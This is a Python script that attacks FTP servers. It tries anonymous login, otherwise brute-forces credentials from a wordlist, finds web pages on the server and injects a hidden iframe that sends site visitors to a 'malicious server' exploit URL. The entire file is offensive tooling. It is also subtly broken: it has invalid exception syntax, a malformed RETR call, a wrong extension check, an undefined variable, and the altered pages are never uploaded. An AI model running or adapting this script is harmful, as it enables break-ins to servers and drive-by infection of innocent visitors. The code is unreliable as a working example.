import ftplib
import optparse

MALICIOUS_SERVER = '192.168.1.154:8000/exploit'
ANONYMOUS_LOGIN = False

def loginWithAnonymous(host):

    try:
        connection = ftplib.FTP(host)
        connection.login('Anonymous','yolo@gmail.com')
        print("[+] Connection Successful.  Host is Vulnerable to Anonymous FTP Logins!")
        connection.quit()
        return True

    except e:
        print("[-] Connection Not Possible via Anonymous Login")
        return False

def loginBruteForce(host, credentials):

    file = open(credentials, 'r')

    for userDetails in file:
        username = userDetails.split(':')[0]
        password = userDetails.split(':')[1].strip('\r').strip('\n')

        try:
            connection = ftplib.FTP(host)
            connection.login(username, password)
            print("[+] Login Success! Credentials Found!")
            connection.quit()
            return (username, password)

        except e:
            print("[*] Continuing to Search ...")

    print("[-] Failed to Brute Force into FTP Server")
    return None

def directoryListing(ftpConnection):

    try:
        directory = ftpConnection.nlist()

    except:
        directory = []
        print("[-] Unable to List Directory")

    webFiles = []
    for file in directory:
        if file.split('.')[1] == '.php' or file.split('.')[1] == '.htm' or file.split('.')[1] == '.html' or file.split('.')[1] == '.asp':
            webFiles.append(file)

    return webFiles

def maliciousInjection(ftpConnection, page):

    temporaryInjectionFile = open(page + '.tmp', 'w')

    ftpConnection.retrlines('RETR' + page, temporaryInjectionFile.write())

    temporaryInjectionFile.write('<iframe src=' + MALICIOUS_SERVER + '></iframe>')
    temporaryInjectionFile.close()

    print("[+] Successfully Injected Malicious Redirect into FTP Server at Page: {infected}".format(infected=page))


def main():

    command = optparse.OptionParser('usage%prog -h <target host>')
    command.add_option('-h', dest='target', type='string', help='specify the target of this specific attack')

    host = command.target

    if loginWithAnonymous(host):
        ftpConnection = ftplib.FTP(host)
        ftpConnection.login('Anonymous', 'hellofrom@gmail.com')

    else:
        username, password = loginBruteForce(host, credentials)
        ftpConnection = ftplib.FTP(host)
        ftpConnection.login(username, password)

    webPages = directoryListing(ftpConnection)

    for webpage in webPages:
        maliciousInjection(ftpConnection, webpage)

if __name__ == "__main__":
    main()
